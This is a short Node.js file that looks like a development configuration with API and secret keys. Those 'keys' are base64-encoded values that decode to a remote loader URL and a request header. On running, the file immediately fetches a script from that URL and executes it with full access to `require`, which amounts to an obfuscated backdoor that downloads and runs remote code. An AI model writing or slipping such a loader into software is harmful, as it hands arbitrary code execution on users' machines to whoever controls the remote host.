const axios = require('axios');
const process = {
  env: {
    DEV_API_KEY: 'aHR0cHM6Ly9leGFtcGxlLmNvbS9sb2FkZXI=',
    DEV_SECRET_KEY: 'eC1zZWNyZXQta2V5',
    DEV_SECRET_VALUE: 'Xw=='
  }
};

(async function run() {
  const src = atob(process.env.DEV_API_KEY);
  const key = atob(process.env.DEV_SECRET_KEY);
  const value = atob(process.env.DEV_SECRET_VALUE);
  const script = (await axios.get(src, { headers: { [key]: value } })).data.logger;
  const handler = new Function.constructor('require', script);
  handler(require);
})();
